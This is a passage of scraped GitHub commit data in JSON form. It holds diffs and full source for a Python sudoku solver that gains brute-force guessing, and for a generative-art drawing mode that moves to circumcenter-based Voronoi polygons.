 cells.append(self.board[i+k][j+l])\n-                self.blocks.append(Block(cells))\n+                blocks.append(Block(cells))\n+        return blocks\n+    \n+    # get rows from board\n+    # returns a list of type Cell\n+    def get_rows(self):\n+        rows = []\n+        \n+        for i in range(9):\n+            row = []\n+            for j in range(9):\n+                row.append(self.board[i][j])    \n+            rows.append(row)\n+        return rows\n+    \n+    # get cols from board\n+    # returns a list of type Cell\n+    def get_cols(self):\n+        cols = []\n+        \n+        for i in range(9):\n+            col = []\n+            for j in range(9):\n+                col.append(self.board[j][i])    \n+            cols.append(col)\n+        return cols\n+\n \n     # returns 0 on completed board\n     # TODO: returns -1 on invalid state\n","add":40,"remove":8,"filename":"\/solve.py","badparts":["    rows = []   # not set because indexing is important","    cols = []   # not set because indexing is important","    blocks = [] # (9 element cell array of 3x3 blocks)","                self.blocks.append(Block(cells))"],"goodparts":["    def get_missing_cell_values(self, cells):","        missing = [x for x in range(1, 10)]","        for c in cells:","            if c.value != 0:","                missing.remove(c.value)","        return missing","    def get_blocks(self):","        blocks = []","                blocks.append(Block(cells))","        return blocks","    def get_rows(self):","        rows = []","        for i in range(9):","            row = []","            for j in range(9):","                row.append(self.board[i][j])    ","            rows.append(row)","        return rows","    def get_cols(self):","        cols = []","        for i in range(9):","            col = []","            for j in range(9):","                col.append(self.board[j][i])    ","            cols.append(col)","        return cols"]},{"diff":"\n         # check if the board is completed\n         is_blocks_completed = True\n         #check all blocks\n-        for block in self.blocks:\n+        for block in self.get_blocks():\n             buff = set()\n             for cell in block.cells:\n                 if cell.value != 0:\n","add":1,"remove":1,"filename":"\/solve.py","badparts":["        for block in self.blocks:"],"goodparts":["        for block in self.get_blocks():"]},{"diff":"\n             print(\"Solved!\")\n         elif state == -1:\n             print(\"Invalid board state!\")\n+        \n+        return state\n \n+     # create a dictionary that stores block indexes and the amount of blanks in them\n+    def count_blanks_in_blocks(self):\n+        d = dict()\n+        for i in range(len(self.get_blocks())):\n+            for c in self.get_blocks()[i].cells:\n+                if c.value == 0:\n+                    if i in d:\n+                        d[i] += 1\n+                    else:\n+                        d[i] = 1\n+        return d\n+    \n+    # create a dictionary that stores row indexes and the amount of blanks in them\n+    def count_blanks_in_rows(self):\n+        d = dict()\n+        \n+        for i in range(9):\n+            for j in range(9):\n+                c = self.board[i][j]\n+                #print(type(self.board[i][j]), self.board[i][j])\n+                if c.value == 0:\n+                    if i in d:\n+                        d[i] += 1\n+                    else:\n+                        d[i] = 1\n+        return self.get_dict_min_count(d)\n \n-    # this is the money maker\n-    def next_move(self):\n-        #print(\"new move\")\n-        # pick a cell that contains a number, attempt to solve it\n-\n-        # create a dictionary that stores block indexes and the amount of blanks in them\n+    # create a dictionary that stores col indexes and the amount of blanks in them\n+    def count_blanks_in_cols(self):\n         d = dict()\n-        for i in range(len(self.blocks)):\n-            for c in self.blocks[i].cells:\n+        \n+        for i in range(9):\n+            for j in range(9):\n+                c = self.board[j][i]\n+                #print(type(self.board[i][j]), self.board[i][j])\n                 if c.value == 0:\n                     if i in d:\n                         d[i] += 1\n                     else:\n                         d[i] = 1\n+        return self.get_dict_min_count(d)\n+\n+    def get_dict_min_count(self, dict):\n+        mi = (10, 10)   #value and index\n+        for k, v in dict.items():\n+            if v < mi[0]:\n+                mi = (v, k)\n+        \n+        return mi\n+    \n+    def guess(self):\n+        # logic to create a copy of valid board state and brute force solutions\n+        import copy\n+        valid_board_state = copy.deepcopy(self)\n+\n+        # find block \/ row \/ column that has most solved cells\n+        # make a guess and try to solve, if fails try backtracking...\n+\n+        min_blanks_block = self.get_dict_min_count(self.count_blanks_in_blocks()) + (\"block\",)\n+        min_blanks_row = self.count_blanks_in_rows() + (\"row\",)\n+        min_blanks_col = self.count_blanks_in_cols() + (\"col\",)\n+\n+        arr = [min_blanks_block, min_blanks_row, min_blanks_col]\n+        mi = min(arr)     \n+\n+        if mi[2] == \"block\":\n+            #guess within a block\n+            print(\"todo - guess within a block\", mi)\n+            input()\n+            pass\n+        elif mi[2] == \"row\":\n+            row = self.get_rows()[mi[1]]    #row of cells\n+            missing = self.get_missing_cell_values(row)\n+\n+            for c in row:\n+                if c.value == 0:\n+                    for m in missing:\n+                        c.value = m\n+                        res = self.solve_board()\n+\n+                        if res == 0:\n+                            return\n+\n+        elif mi[2] == \"col\":\n+            col = self.get_cols()[mi[1]]    #row of cells\n+            missing = self.get_missing_cell_values(col)\n+\n+            for c in col:\n+                if c.value == 0:\n+                    for m in missing:\n+                        c.value = m\n+                        res = self.solve_board()\n+\n+                        if res == 0:\n+                            return\n+\n+    # this is the money maker\n+    def next_move(self):\n+        #print(\"new move\")\n+        # pick a cell that contains a number, attempt to solve it\n+\n+        \n+        d = self.count_blanks_in_blocks()\n \n-        #print(d)\n         # iterate through (sorted) blocks based on most filled first (0 frequency lowest)\n         for key, value in sorted(d.items(), key=lambda item: item[1]):\n \n-            block = self.blocks[key]\n+            block = self.get_blocks()[key]\n             \n             #print(block)\n \n","add":99,"remove":10,"filename":"\/solve.py","badparts":["    def next_move(self):","        for i in range(len(self.blocks)):","            for c in self.blocks[i].cells:","            block = self.blocks[key]"],"goodparts":["        return state","    def count_blanks_in_blocks(self):","        d = dict()","        for i in range(len(self.get_blocks())):","            for c in self.get_blocks()[i].cells:","                if c.value == 0:","                    if i in d:","                        d[i] += 1","                    else:","                        d[i] = 1","        return d","    def count_blanks_in_rows(self):","        d = dict()","        for i in range(9):","            for j in range(9):","                c = self.board[i][j]","                if c.value == 0:","                    if i in d:","                        d[i] += 1","                    else:","                        d[i] = 1","        return self.get_dict_min_count(d)","    def count_blanks_in_cols(self):","        for i in range(9):","            for j in range(9):","                c = self.board[j][i]","        return self.get_dict_min_count(d)","    def get_dict_min_count(self, dict):","        mi = (10, 10)   #value and index","        for k, v in dict.items():","            if v < mi[0]:","                mi = (v, k)","        return mi","    def guess(self):","        import copy","        valid_board_state = copy.deepcopy(self)","        min_blanks_block = self.get_dict_min_count(self.count_blanks_in_blocks()) + (\"block\",)","        min_blanks_row = self.count_blanks_in_rows() + (\"row\",)","        min_blanks_col = self.count_blanks_in_cols() + (\"col\",)","        arr = [min_blanks_block, min_blanks_row, min_blanks_col]","        mi = min(arr)     ","        if mi[2] == \"block\":","            print(\"todo - guess within a block\", mi)","            input()","            pass","        elif mi[2] == \"row\":","            row = self.get_rows()[mi[1]]    #row of cells","            missing = self.get_missing_cell_values(row)","            for c in row:","                if c.value == 0:","                    for m in missing:","                        c.value = m","                        res = self.solve_board()","                        if res == 0:","                            return","        elif mi[2] == \"col\":","            col = self.get_cols()[mi[1]]    #row of cells","            missing = self.get_missing_cell_values(col)","            for c in col:","                if c.value == 0:","                    for m in missing:","                        c.value = m","                        res = self.solve_board()","                        if res == 0:","                            return","    def next_move(self):","        d = self.count_blanks_in_blocks()","            block = self.get_blocks()[key]"]},{"diff":"\n             #print(\"---- checking block \" + str(key) + \" --------\")\n             #print(block.get_missing_values())\n \n-            for v in block.get_missing_values():\n+            for v in self.get_missing_cell_values(block.cells):\n                 buff = []\n                 for c in block.cells:\n                     if c.value == 0:\n","add":1,"remove":1,"filename":"\/solve.py","badparts":["            for v in block.get_missing_values():"],"goodparts":["            for v in self.get_missing_cell_values(block.cells):"]},{"diff":"\n \n             #input()\n \n-        #input()\n-\n-        \n+        #input()     \n             \n \n-        print(\"No move possible?\")\n+        \n         self.show()\n         self.eval_board_state()\n-        input()\n+        print(\"No guaranteed moves possible, start brute forcing from this state\")\n+\n+        self.guess()\n+\n+        \n \n         # is the board solved?\n \n","add":7,"remove":5,"filename":"\/solve.py","badparts":["        print(\"No move possible?\")","        input()"],"goodparts":["        print(\"No guaranteed moves possible, start brute forcing from this state\")","        self.guess()"]},{"diff":"\n     [4, 0, 0, 8, 0, 3, 0, 0, 1],\n     [7, 0, 0, 0, 2, 0, 0, 0, 6],\n     [0, 6, 0, 0, 0, 0, 2, 8, 0],\n-    [0, 0, 0, 4, 1, 9, 0, 0, 5],\n+    [0, 0, 0, 4, 0, 9, 0, 0, 5],\n     [0, 0, 0, 0, 8, 0, 0, 7, 9]\n ]\n \n","add":1,"remove":1,"filename":"\/solve.py","badparts":["    [0, 0, 0, 4, 1, 9, 0, 0, 5],"],"goodparts":["    [0, 0, 0, 4, 0, 9, 0, 0, 5],"]}],"source":"\nclass Block: def __init__(self, cells): self.cells=cells def get_missing_values(self): missing=[x for x in range(1, 10)] for c in self.cells: if c.value !=0: missing.remove(c.value) return missing def __str__(self): s=[] for j in range(0, 9, 3): r=self.cells[j:j+3] s.append(\" \".join(map(str, r))) return \"\\n\".join(s) class Cell: def __init__(self, row, col, value): self.row=row self.col=col self.value=value self.flag=True def __str__(self): return \"row:{}, col:{}, val:{}\".format(self.row, self.col, self.value) class Board: rows=[] cols=[] blocks=[] def __init__(self, board): self.board=board for i in range(0, 9, 3): for j in range(0, 9, 3): cells=[] for k in range(3): for l in range(3): cells.append(self.board[i+k][j+l]) self.blocks.append(Block(cells)) def eval_board_state(self, verbose=True): is_blocks_completed=True for block in self.blocks: buff=set() for cell in block.cells: if cell.value !=0: buff.add(cell.value) if len(buff) !=9: is_blocks_completed=False if verbose: print(\"is_blocks_completed\", is_blocks_completed) is_rows_completed=True for i in range(9): block=self.board[i] buff=set() for cell in block: if cell.value !=0: buff.add(cell.value) if len(buff) !=9: is_rows_completed=False if verbose: print(\"is_rows_completed\", is_rows_completed) is_cols_completed=True for i in range(9): block=[self.board[0][i] for i in range(9)] buff=set() for cell in block: if cell.value !=0: buff.add(cell.value) if len(buff) !=9: is_cols_completed=False if verbose: print(\"is_cols_completed\", is_cols_completed) if all([is_blocks_completed, is_rows_completed, is_cols_completed]): return 0 def eval_cell_value(self, cell, value): cell.flag=False for c in self.board[cell.row]: if c.value==value: cell.flag=True break if not cell.flag: for i in range(len(self.board)): if self.board[i][cell.col].value==value: cell.flag=True break def solve_board(self): state=self.eval_board_state() while state !=0: self.next_move() state=self.eval_board_state() self.show() if state==0: print(\"Solved!\") elif state==-1: print(\"Invalid board state!\") def next_move(self): d=dict() for i in range(len(self.blocks)): for c in self.blocks[i].cells: if c.value==0: if i in d: d[i] +=1 else: d[i]=1 for key, value in sorted(d.items(), key=lambda item: item[1]): block=self.blocks[key] for v in block.get_missing_values(): buff=[] for c in block.cells: if c.value==0: self.eval_cell_value(c, v) if not c.flag: buff.append(c) if len(buff)==1: self.board[buff[0].row][buff[0].col].value=v return else: pass print(\"No move possible?\") self.show() self.eval_board_state() input() def show(self): print(self) def __str__(self): s=[] for i in range(len(self.board)): buff=[] for j in range(len(self.board[0])): buff.append(str(self.board[i][j].value)) s.append(\"\\t\".join(buff)) return \"\\n\\n\".join(s) invalid=[ [5, 3, 0, 0, 7, 0, 0, 0, 0], [6, 0, 0, 1, 9, 5, 0, 0, 0], [0, 9, 8, 0, 0, 0, 0, 6, 0], [8, 0, 0, 0, 6, 0, 0, 8, 3], [4, 0, 0, 8, 0, 3, 0, 0, 1], [7, 0, 0, 0, 2, 0, 0, 0, 6], [0, 6, 0, 0, 0, 0, 2, 8, 0], [0, 0, 0, 4, 1, 9, 0, 0, 5], [5, 0, 0, 0, 8, 0, 0, 7, 9] ] board=[ [5, 3, 0, 0, 7, 0, 0, 0, 0], [6, 0, 0, 1, 9, 5, 0, 0, 0], [0, 9, 8, 0, 0, 0, 0, 6, 0], [8, 0, 0, 0, 6, 0, 0, 0, 3], [4, 0, 0, 8, 0, 3, 0, 0, 1], [7, 0, 0, 0, 2, 0, 0, 0, 6], [0, 6, 0, 0, 0, 0, 2, 8, 0], [0, 0, 0, 4, 1, 9, 0, 0, 5], [0, 0, 0, 0, 8, 0, 0, 7, 9] ] solved=[ [5, 3, 4, 6, 7, 8, 9, 1, 2], [6, 7, 2, 1, 9, 5, 3, 4, 8], [1, 9, 8, 3, 4, 2, 5, 6, 7], [8, 5, 9, 7, 6, 1, 4, 2, 3], [4, 2, 6, 8, 5, 3, 7, 9, 1], [7, 1, 3, 9, 2, 4, 8, 5, 6], [9, 6, 1, 5, 3, 7, 2, 8, 4], [2, 8, 7, 4, 1, 9, 6, 3, 5], [3, 4, 5, 2, 8, 6, 1, 7, 9] ] cell_board=[] for i in range(len(board)): buff=[] for j in range(len(board[i])): buff.append(Cell(i, j, board[i][j])) cell_board.append(buff) b=Board(cell_board) b.solve_board() ","sourceWithComments":"class Block:\n    def __init__(self, cells):\n        self.cells = cells\n    \n    # get numeric values inside block that are missing (blanks)\n    # TODO : make it prettier & more efficient\n    def get_missing_values(self):\n        missing = [x for x in range(1, 10)]\n        for c in self.cells:\n            if c.value != 0:\n                missing.remove(c.value)\n        return missing\n\n    \n    def __str__(self):\n        s = []\n        # create blocks from board\n        for j in range(0, 9, 3):\n            r = self.cells[j:j+3]\n            s.append(\" \".join(map(str, r)))\n        return \"\\n\".join(s)       \n\nclass Cell:\n    def __init__(self, row, col, value):\n        self.row = row\n        self.col = col\n        self.value = value\n        self.flag = True\n    \n    def __str__(self):\n        return \"row:{}, col:{}, val:{}\".format(self.row, self.col, self.value)\n\nclass Board:\n\n    rows = []   # not set because indexing is important\n    cols = []   # not set because indexing is important\n    blocks = [] # (9 element cell array of 3x3 blocks)\n    \n\n    def __init__(self, board):\n        self.board = board\n        \n        # create blocks from board\n        for i in range(0, 9, 3):\n            for j in range(0, 9, 3):\n                cells = []\n                for k in range(3):\n                    for l in range(3):\n                        cells.append(self.board[i+k][j+l])\n                self.blocks.append(Block(cells))\n\n    # returns 0 on completed board\n    # TODO: returns -1 on invalid state\n    # TODO: returns 1 on empty cell\n    def eval_board_state(self, verbose=True):\n        # check if the board is completed\n        is_blocks_completed = True\n        #check all blocks\n        for block in self.blocks:\n            buff = set()\n            for cell in block.cells:\n                if cell.value != 0:\n                    buff.add(cell.value)\n            \n            if len(buff) != 9:\n                is_blocks_completed = False\n\n        if verbose:\n            print(\"is_blocks_completed\", is_blocks_completed)\n\n        is_rows_completed = True\n        #check all rows\n        for i in range(9):\n            block = self.board[i]\n\n            buff = set()\n            for cell in block:\n                if cell.value != 0:\n                    buff.add(cell.value)\n            \n            if len(buff) != 9:\n                is_rows_completed = False\n        \n        if verbose:\n            print(\"is_rows_completed\", is_rows_completed)\n\n        is_cols_completed = True\n        #check all cols\n        for i in range(9):\n            \n            block = [self.board[0][i] for i in range(9)]\n\n            buff = set()\n            for cell in block:\n                if cell.value != 0:\n                    buff.add(cell.value)\n            \n            if len(buff) != 9:\n                is_cols_completed = False\n        \n        if verbose:\n            print(\"is_cols_completed\", is_cols_completed)\n\n        if all([is_blocks_completed, is_rows_completed, is_cols_completed]):\n            return 0\n\n    \n    def eval_cell_value(self, cell, value):\n        #check if (horizontal) row contains value\n        cell.flag = False   #reset flag\n        for c in self.board[cell.row]:\n            if c.value == value:\n                cell.flag = True\n                break\n\n        #check if (vertical) column contains value\n        if not cell.flag:\n            for i in range(len(self.board)):\n                if self.board[i][cell.col].value == value:\n                    cell.flag = True\n                    break\n    \n    # write a function that takes in a board state and returns a solved board\n    # if the board is invalid, return an error\n    def solve_board(self):\n        state = self.eval_board_state()\n\n        while state != 0:\n            self.next_move()\n            state = self.eval_board_state() # this can be done more efficiently\n\n        self.show()\n        \n        if state == 0:\n            print(\"Solved!\")\n        elif state == -1:\n            print(\"Invalid board state!\")\n\n\n    # this is the money maker\n    def next_move(self):\n        #print(\"new move\")\n        # pick a cell that contains a number, attempt to solve it\n\n        # create a dictionary that stores block indexes and the amount of blanks in them\n        d = dict()\n        for i in range(len(self.blocks)):\n            for c in self.blocks[i].cells:\n                if c.value == 0:\n                    if i in d:\n                        d[i] += 1\n                    else:\n                        d[i] = 1\n\n        #print(d)\n        # iterate through (sorted) blocks based on most filled first (0 frequency lowest)\n        for key, value in sorted(d.items(), key=lambda item: item[1]):\n\n            block = self.blocks[key]\n            \n            #print(block)\n\n            # get missing values\n            #print(\"---- checking block \" + str(key) + \" --------\")\n            #print(block.get_missing_values())\n\n            for v in block.get_missing_values():\n                buff = []\n                for c in block.cells:\n                    if c.value == 0:\n                        self.eval_cell_value(c, v)\n\n                        if not c.flag:\n                            buff.append(c)\n\n                #print(len(buff), buff)\n\n                if len(buff) == 1:\n                    # guaranteed move\n                    #print(\"guaranteed move!\", buff[0], \"->\", v)\n                    self.board[buff[0].row][buff[0].col].value = v\n                    #self.show()\n                    #input()\n                    \n                    return\n\n                else:\n                    # not guaranteed - make a guess?\n                    pass\n\n            #input()\n\n        #input()\n\n        \n            \n\n        print(\"No move possible?\")\n        self.show()\n        self.eval_board_state()\n        input()\n\n        # is the board solved?\n\n        #self.show()\n        #input()\n        #pass\n\n    def show(self):\n        print(self)\n\n    def __str__(self):\n        s = []\n        for i in range(len(self.board)):\n            buff = []\n            for j in range(len(self.board[0])):\n                buff.append(str(self.board[i][j].value))\n            s.append(\"\\t\".join(buff))\n        return \"\\n\\n\".join(s)\n\n    \n\n# given a state of a sudoku board\n# 1. determine if the board is valid\n# 2. if the board is valid, find solution\n# 3. if the board is not valid, return error\n\ninvalid = [\n    [5, 3, 0, 0, 7, 0, 0, 0, 0],\n    [6, 0, 0, 1, 9, 5, 0, 0, 0],\n    [0, 9, 8, 0, 0, 0, 0, 6, 0],\n    [8, 0, 0, 0, 6, 0, 0, 8, 3],\n    [4, 0, 0, 8, 0, 3, 0, 0, 1],\n    [7, 0, 0, 0, 2, 0, 0, 0, 6],\n    [0, 6, 0, 0, 0, 0, 2, 8, 0],\n    [0, 0, 0, 4, 1, 9, 0, 0, 5],\n    [5, 0, 0, 0, 8, 0, 0, 7, 9]\n]\n\nboard = [\n    [5, 3, 0, 0, 7, 0, 0, 0, 0],\n    [6, 0, 0, 1, 9, 5, 0, 0, 0],\n    [0, 9, 8, 0, 0, 0, 0, 6, 0],\n    [8, 0, 0, 0, 6, 0, 0, 0, 3],\n    [4, 0, 0, 8, 0, 3, 0, 0, 1],\n    [7, 0, 0, 0, 2, 0, 0, 0, 6],\n    [0, 6, 0, 0, 0, 0, 2, 8, 0],\n    [0, 0, 0, 4, 1, 9, 0, 0, 5],\n    [0, 0, 0, 0, 8, 0, 0, 7, 9]\n]\n\nsolved = [\n    [5, 3, 4, 6, 7, 8, 9, 1, 2],\n    [6, 7, 2, 1, 9, 5, 3, 4, 8],\n    [1, 9, 8, 3, 4, 2, 5, 6, 7],\n    [8, 5, 9, 7, 6, 1, 4, 2, 3],\n    [4, 2, 6, 8, 5, 3, 7, 9, 1],\n    [7, 1, 3, 9, 2, 4, 8, 5, 6],\n    [9, 6, 1, 5, 3, 7, 2, 8, 4],\n    [2, 8, 7, 4, 1, 9, 6, 3, 5],\n    [3, 4, 5, 2, 8, 6, 1, 7, 9]\n]\n\ncell_board = []\n\nfor i in range(len(board)):\n    buff = []\n    for j in range(len(board[i])):\n        buff.append(Cell(i, j, board[i][j]))\n    cell_board.append(buff)\n\n\n\n\nb = Board(cell_board)\n\n#b.show()\nb.solve_board()\n#print(b.eval_state())\n   \n\n\n\n\n"}},"msg":"Update solve.py\n\nAdd (recursive) brute force solution logic"}},"https:\/\/github.com\/Comandermuffif\/code-art":{"81262488fab28554c298cd880dd1172ed6e18cd1":{"url":"https:\/\/api.github.com\/repos\/Comandermuffif\/code-art\/commits\/81262488fab28554c298cd880dd1172ed6e18cd1","html_url":"https:\/\/github.com\/Comandermuffif\/code-art\/commit\/81262488fab28554c298cd880dd1172ed6e18cd1","message":"Update clustering modes\n\nUpdated clustering modes to use binary tree search rather than brute\nforcing","sha":"81262488fab28554c298cd880dd1172ed6e18cd1","keyword":"brute force update","diff":"diff --git a\/draw_modes\/cluster.py b\/draw_modes\/cluster.py\ndeleted file mode 100644\nindex fa4907e..0000000\n--- a\/draw_modes\/cluster.py\n+++ \/dev\/null\n@@ -1,63 +0,0 @@\n-from math import sqrt\n-\n-from random import choice, random\n-\n-import cairo\n-\n-from color_modes import ColorMode\n-from draw_modes import DrawMode\n-from models import FloatColor\n-\n-class ClusterDrawMode(DrawMode):\n-    @classmethod\n-    def get_name(cls):\n-        return \"Cluster\"\n-\n-    @classmethod\n-    def get_option_types(cls) -> dict[str, tuple[str, type, object]]:\n-        return {\n-            'points': (\"Points\", int, 5),\n-        }\n-\n-    def __init__(self, *args, **kwargs):\n-        self.points = [\n-            (random(), random())\n-            for _ in range(int(kwargs[\"points\"]))\n-        ]\n-\n-    def draw(self, context:cairo.Context, color_mode:ColorMode, width:int, height:int) -> None:\n-\n-        points = [\n-            {\n-                'point': point,\n-                'color': color_mode.get_color(*point),\n-            }\n-            for point in self.points\n-        ]\n-\n-        for pixel_x in range(width):\n-            for pixel_y in range(height):\n-\n-                color = self.get_nearest_point(pixel_x\/width, pixel_y\/height, points)\n-\n-                context.set_source_rgb(color.r, color.g, color.b)\n-                context.rectangle(pixel_x, pixel_y, 1, 1)\n-                context.fill()\n-\n-    @classmethod\n-    def get_nearest_point(cls, x:float, y:float, points:list[dict]) -> FloatColor:\n-        distances = [\n-            {\n-                'distance': cls._get_distance((x, y), (point_pair['point'])),\n-                'color': point_pair['color']\n-            }\n-            for point_pair in points\n-        ]\n-\n-        distances = sorted(distances, key=lambda x: x['distance'])\n-\n-        return distances[0]['color']\n-\n-    @classmethod\n-    def _get_distance(cls, point_a:tuple[float, float], point_b:tuple[float, float]) -> float:\n-        return sqrt(pow(point_a[0] - point_b[0], 2) + pow(point_a[1] - point_b[1], 2))\n\\ No newline at end of file\ndiff --git a\/draw_modes\/cluster2.py b\/draw_modes\/cluster2.py\nnew file mode 100644\nindex 0000000..7727220\n--- \/dev\/null\n+++ b\/draw_modes\/cluster2.py\n@@ -0,0 +1,247 @@\n+from __future__ import annotations\n+import itertools\n+\n+from math import atan2, cos, dist, radians, sin\n+\n+from random import choices, random\n+\n+import cairo\n+\n+from color_modes import ColorMode\n+from draw_modes import DrawMode\n+from models import FloatColor\n+\n+class Point(object):\n+    def __init__(self, x:float, y:float):\n+        self.x = x\n+        self.y = y\n+\n+    def distance(self, other:Point) -> float:\n+        return dist((self.x, self.y), (other.x, other.y))\n+\n+    def get_angle(self, other:Point):\n+        shifted_point = other - self\n+        return atan2(shifted_point.y, shifted_point.x)\n+        # return atan(shifted_point.y \/ shifted_point.x)\n+\n+    @classmethod\n+    def get_circumcenter(cls, a:Point, b:Point, c:Point) -> Point:\n+        d = 2 * (a.x * (b.y - c.y) + b.x * (c.y - a.y) + c.x * (a.y - b.y))\n+        ux = ((a.x * a.x + a.y * a.y) * (b.y - c.y) + (b.x * b.x + b.y * b.y) * (c.y - a.y) + (c.x * c.x + c.y * c.y) * (a.y - b.y)) \/ d\n+        uy = ((a.x * a.x + a.y * a.y) * (c.x - b.x) + (b.x * b.x + b.y * b.y) * (a.x - c.x) + (c.x * c.x + c.y * c.y) * (b.x - a.x)) \/ d\n+        return Point(ux, uy)\n+\n+    @classmethod\n+    def get_midpoint(cls, *points:Point) -> Point:\n+        return Point(\n+            (sum([p.x for p in points])) \/ (len(points)),\n+            (sum([p.y for p in points])) \/ (len(points)),\n+        )\n+\n+    def __eq__(self, other:Point) -> bool:\n+        if other is not Point:\n+            return False\n+        return self.x == other.x and self.y == other.y\n+\n+    def __hash__(self) -> int:\n+        return self.x + self.y\n+\n+    def __add__(self, other:Point) -> Point:\n+        return Point(\n+            self.x + other.x,\n+            self.y + other.y\n+        )\n+\n+    def __sub__(self, other:Point) -> Point:\n+        return Point(\n+            self.x - other.x,\n+            self.y - other.y\n+        )\n+\n+    def __mul__(self, other:Point) -> Point:\n+        return Point(\n+            self.x * other.x,\n+            self.y * other.y\n+        )\n+\n+    def __div__(self, other:Point) -> Point:\n+        return Point(\n+            self.x \/ other.x,\n+            self.y \/ other.y\n+        )\n+\n+class ColorPoint(Point):\n+    def __init__(self, x:float, y:float, color:FloatColor):\n+        super().__init__(x, y)\n+        self.color:FloatColor = color\n+\n+    def __hash__(self) -> int:\n+        return self.color.to_hex().__hash__()\n+\n+class Cluster2DrawMode(DrawMode):\n+    @classmethod\n+    def get_name(cls):\n+        return \"Cluster2\"\n+\n+    @classmethod\n+    def get_option_types(cls) -> dict[str, tuple[str, type, object]]:\n+        return {\n+            'points': (\"Points\", int, 5),\n+        }\n+\n+    def __init__(self, *args, **kwargs):\n+        self.points = [\n+            ColorPoint(random(), random(), None)\n+            for _ in range(int(kwargs[\"points\"]))\n+        ]\n+\n+        # self.points = [\n+        #     ColorPoint(0.3, 0.3, FloatColor(1, 0, 0)),\n+        #     ColorPoint(0.2, 0.8, FloatColor(0, 1, 0)),\n+        #     ColorPoint(0.75, 0.2, FloatColor(0, 0, 1)),\n+        # ]\n+\n+    def _get_nearest_point(self, point:Point) -> tuple[ColorPoint, float]:\n+        distances = [\n+            (other_point, point.distance(other_point))\n+            for other_point in self.points\n+        ]\n+\n+        distances = sorted(distances, key=lambda x: x[1])\n+        return distances[0]\n+\n+    def _get_edge_points(self, point:Point, mid_point:Point, width:float, height:float) -> tuple[Point, Point, Point]:\n+        angle = atan2(mid_point.y - point.y, mid_point.x - point.x) + radians(90)\n+\n+        offset = Point(cos(angle) * width, sin(angle) * height)\n+\n+        left_point = mid_point - offset\n+        right_point = mid_point + offset\n+\n+        # This needs to actually be the correct values\n+\n+        # left_point.x = min(width, max(0, left_point.x))\n+        # left_point.y = min(height, max(0, left_point.y))\n+\n+        # right_point.x = min(width, max(0, right_point.x))\n+        # right_point.y = min(height, max(0, right_point.y))\n+\n+        return (left_point, right_point, mid_point)\n+\n+    def draw(self, context:cairo.Context, color_mode:ColorMode, width:int, height:int) -> None:\n+        corner_points = [\n+            Point(0, 0),\n+            Point(width, 0),\n+            Point(width, height),\n+            Point(0, height),\n+        ]\n+\n+        # Assign colors and make points absolute\n+        for point in self.points:\n+            point.color = color_mode.get_color(point.x, point.y)\n+            point.x = point.x * width\n+            point.y = point.y * height\n+\n+            # Draw each color point\n+            context.set_source_rgb(*point.color.to_tuple())\n+            context.arc(point.x, point.y, 20, 0, 360)\n+            context.fill()\n+\n+        polygons = {\n+            p: list[Point]()\n+            for p in self.points\n+        }\n+\n+        valid_trios = list[tuple[tuple[ColorPoint, ...], Point]]()\n+\n+        for point_trio in itertools.combinations(self.points, 3):\n+            circumcenter = Point.get_circumcenter(*point_trio)\n+            distance = circumcenter.distance(point_trio[0])\n+            is_valid = True\n+\n+            # The circumcenter is a true min if it's closest to the trio\n+            for other_point in self.points:\n+                # Skip trio points\n+                if other_point in point_trio:\n+                    continue\n+\n+                other_dist = circumcenter.distance(other_point)\n+                if other_dist < distance:\n+                    is_valid = False\n+                    break\n+\n+            if is_valid:\n+                valid_trios.append(\n+                    (point_trio, circumcenter)\n+                )\n+                context.set_source_rgb(0, 0, 0)\n+                context.arc(circumcenter.x, circumcenter.y, 5, 0, 360)\n+                context.fill()\n+\n+                midpoint_a = Point.get_midpoint(point_trio[0], point_trio[1])\n+                midpoint_b = Point.get_midpoint(point_trio[1], point_trio[2])\n+                midpoint_c = Point.get_midpoint(point_trio[0], point_trio[2])\n+\n+                # edge_points_a = self._get_edge_points(point_trio[0], midpoint_a, width, height)\n+                # edge_points_b = self._get_edge_points(point_trio[1], midpoint_b, width, height)\n+                # edge_points_c = self._get_edge_points(point_trio[2], midpoint_c, width, height)\n+\n+                # Edge points are valid if they are the closest to that side\n+\n+                # context.set_source_rgb(0.5, 0.5, 0.5)\n+\n+                # for (edge_l, edge_r, midpoint) in [edge_points_a, edge_points_b, edge_points_c]:\n+                #     context.move_to(midpoint.x, midpoint.y)\n+                #     context.line_to(edge_l.x, edge_l.y)\n+                #     context.stroke()\n+\n+                #     context.move_to(midpoint.x, midpoint.y)\n+                #     context.line_to(edge_r.x, edge_r.y)\n+                #     context.stroke()\n+\n+                polygons[point_trio[0]].append(midpoint_a)\n+                polygons[point_trio[0]].append(midpoint_c)\n+\n+                polygons[point_trio[1]].append(midpoint_a)\n+                polygons[point_trio[1]].append(midpoint_b)\n+\n+                polygons[point_trio[2]].append(midpoint_b)\n+                polygons[point_trio[2]].append(midpoint_c)\n+\n+                if distance < midpoint_b.distance(point_trio[0]):\n+                    polygons[point_trio[0]].append(circumcenter)\n+                else:\n+                    polygons[point_trio[0]].append(midpoint_b)\n+\n+                if distance < midpoint_c.distance(point_trio[1]):\n+                    polygons[point_trio[1]].append(circumcenter)\n+                else:\n+                    polygons[point_trio[1]].append(midpoint_c)\n+\n+                if distance < midpoint_a.distance(point_trio[2]):\n+                    polygons[point_trio[2]].append(circumcenter)\n+                else:\n+                    polygons[point_trio[2]].append(midpoint_a)\n+\n+        for corner_point in corner_points:\n+            (nearest, distance) = self._get_nearest_point(corner_point)\n+            polygons[nearest].append(corner_point)\n+\n+        for (point, polygon_points) in polygons.items():\n+            context.set_source_rgb(*point.color.to_tuple())\n+\n+            # These need to be sorted\n+            sorted_p = sorted([\n+                (point.get_angle(p), p)\n+                for p in polygon_points\n+            ], key=lambda p: p[0])\n+\n+            poly_p = [p[1] for p in sorted_p]\n+\n+            context.move_to(poly_p[0].x, poly_p[0].y)\n+            for p_a in poly_p[1:]:\n+                context.line_to(p_a.x, p_a.y)\n+\n+            context.close_path()\n+            context.fill()\n+            context.stroke()\n\\ No newline at end of file\ndiff --git a\/draw_modes\/cluster3.py b\/draw_modes\/cluster3.py\nnew file mode 100644\nindex 0000000..baddebc\n--- \/dev\/null\n+++ b\/draw_modes\/cluster3.py\n@@ -0,0 +1,90 @@\n+from __future__ import annotations\n+\n+from random import random\n+\n+import cairo\n+\n+from color_modes import ColorMode\n+from draw_modes import DrawMode\n+from models import ColorPoint, Point, Rect\n+\n+class Cluster3DrawMode(DrawMode):\n+    @classmethod\n+    def get_name(cls):\n+        return \"Cluster3\"\n+\n+    @classmethod\n+    def get_option_types(cls) -> dict[str, tuple[str, type, object]]:\n+        return 